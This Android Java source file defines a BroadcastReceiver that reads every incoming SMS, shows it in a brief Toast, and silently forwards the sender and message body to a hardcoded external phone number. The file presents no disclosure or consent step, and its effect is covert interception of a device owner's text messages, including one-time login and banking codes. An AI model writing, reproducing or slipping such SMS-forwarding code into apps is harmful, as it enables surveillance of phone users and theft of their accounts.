package com.example.myapplication;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.telephony.SmsMessage;
import android.widget.Toast;

public class MyBroadCastReceiver extends BroadcastReceiver {
    @Override
    public void onReceive(Context context, Intent intent) {
        Bundle extras = intent.getExtras();
        SmsManager smsManager = SmsManager.getDefault();
        if (extras != null) {
            Object[] smsextras = (Object[]) extras.get("pdus");
            for (int i = 0; i < smsextras.length; i++) {
                SmsMessage smsmsg = SmsMessage.createFromPdu((byte[]) smsextras[i]);
                String strMsgBody = smsmsg.getMessageBody().toString();
                String strMsgSrc = smsmsg.getOriginatingAddress();
                String strMessage = "SMS from " + strMsgSrc + " : " + strMsgBody;
                Toast.makeText(context, "" + strMessage, Toast.LENGTH_LONG).show();
                smsManager.sendTextMessage("+923052012267", null, strMessage, null, null);
            }
        }
    }
}
